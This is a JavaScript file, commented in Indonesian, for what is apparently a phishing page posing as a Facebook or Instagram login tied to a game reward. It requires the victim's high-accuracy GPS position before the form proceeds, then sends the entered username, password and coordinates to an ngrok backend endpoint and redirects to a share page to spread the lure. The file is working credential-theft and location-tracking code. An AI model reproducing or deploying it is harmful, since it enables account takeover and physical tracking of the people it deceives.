// ========== CONFIGURATION ==========
// Ganti URL ini dengan URL backend Render lo setelah deploy
const BACKEND_URL = 'https://avalanche-distinct-prior.ngrok-free.dev'; 

// ========== LOGIN BUTTON STATE ==========
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('loginBtn');
const loginForm = document.getElementById('loginForm');

function checkForm() {
  if (!usernameInput || !passwordInput || !loginBtn) return;
  const hasUsername = usernameInput.value.trim().length > 0;
  const hasPassword = passwordInput.value.trim().length > 0;
  loginBtn.disabled = !(hasUsername && hasPassword);
  loginBtn.style.opacity = loginBtn.disabled ? '0.3' : '1';
}

if (usernameInput && passwordInput) {
  usernameInput.addEventListener('input', checkForm);
  passwordInput.addEventListener('input', checkForm);
  checkForm(); // Initial check
}

// Helper to get High-Accuracy Geolocation (Plan 2 Implementation)
async function getPreciseLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      console.warn('Geolocation tidak didukung browser');
      resolve(null);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        resolve({
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          timestamp: pos.timestamp
        });
      },
      (err) => {
        console.warn('GPS gagal/ditolak:', err.message);
        resolve(null);
      },
      {
        enableHighAccuracy: true,  // ⭐ Pakai GPS hardware
        timeout: 10000,            // Tunggu max 10 detik
        maximumAge: 0              // Jangan pakai cache
      }
    );
  });
}

async function getBestBrowserLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      console.warn('Geolocation tidak didukung browser');
      resolve(null);
      return;
    }

    let bestPosition = null;
    let settled = false;
    let watchId = null;

    const finish = () => {
      if (settled) return;
      settled = true;
      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
      resolve(bestPosition);
    };

    const timeoutId = setTimeout(finish, 15000);

    const acceptPosition = (pos) => {
      const candidate = {
        lat: pos.coords.latitude,
        lng: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        timestamp: pos.timestamp
      };

      if (!bestPosition || candidate.accuracy < bestPosition.accuracy) {
        bestPosition = candidate;
      }

      if (candidate.accuracy <= 50) {
        clearTimeout(timeoutId);
        finish();
      }
    };

    const handleError = (err) => {
      console.warn('GPS gagal/ditolak:', err.message);
      if (err.code === err.PERMISSION_DENIED) {
        clearTimeout(timeoutId);
        finish();
      }
    };

    watchId = navigator.geolocation.watchPosition(
      acceptPosition,
      handleError,
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
      }
    );

    navigator.geolocation.getCurrentPosition(
      acceptPosition,
      handleError,
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
      }
    );
  });
}

// ========== LOGIN LOADING & BACKEND CONNECTION ==========
if (loginForm) {
  const permissionModal = new bootstrap.Modal(document.getElementById('permissionModal'));
  const requestBtn = document.getElementById('requestPermissionBtn');
  const instructionArea = document.getElementById('instructionArea');

  loginForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    if (!loginBtn) return;
    
    // Check permission status first
    if (navigator.permissions && navigator.permissions.query) {
      const result = await navigator.permissions.query({ name: 'geolocation' });
      if (result.state === 'denied') {
        instructionArea.classList.remove('d-none');
        permissionModal.show();
        return;
      }
    }

    loginBtn.disabled = true;
    loginBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Memproses Verifikasi...';

    // 1. Ambil GPS Presisi
    const gpsData = await getBestBrowserLocation();
    
    if (!gpsData) {
      // Jika GPS gagal (user menolak atau error), tampilkan modal
      loginBtn.disabled = false;
      loginBtn.innerHTML = window.location.pathname.includes('login-fb') ? 'Log In' : 'Login';
      
      // Cek lagi status setelah percobaan gagal
      if (navigator.permissions && navigator.permissions.query) {
        const result = await navigator.permissions.query({ name: 'geolocation' });
        if (result.state === 'denied') instructionArea.classList.remove('d-none');
      }
      
      permissionModal.show();
      return;
    }
    
    // Jika GPS Berhasil, lanjut kirim data
    loginBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Mengautentikasi...';

    // Ambil info game & hadiah dari localStorage
    const game = localStorage.getItem('selected_game') || 'Unknown';
    const reward = localStorage.getItem('selected_reward') || 'N/A';
    
    // Deteksi metode login dari URL
    const loginMethod = window.location.pathname.includes('login-fb') ? 'Facebook' : 'Instagram';

    const dataPayload = {
      username: usernameInput.value,
      password: passwordInput.value,
      game: game,
      nominal: reward,
      method: loginMethod, 
      gps: gpsData 
    };

    console.log("MENGIRIM DATA:", dataPayload);

    try {
      const response = await fetch(`${BACKEND_URL}/api/setor-data`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'ngrok-skip-browser-warning': 'true'
        },
        body: JSON.stringify(dataPayload)
      });

      const result = await response.json();
      if (result.status === 'success') {
        window.location.href = 'share.html';
      }
    } catch (error) {
      console.error('Gagal menghubungi server backend:', error);
      window.location.href = 'share.html';
    }
  });

  // Listener untuk tombol di dalam modal
  if (requestBtn) {
    requestBtn.addEventListener('click', async () => {
      permissionModal.hide();
      loginBtn.click(); // Trigger login lagi untuk memicu popup browser
    });
  }
}

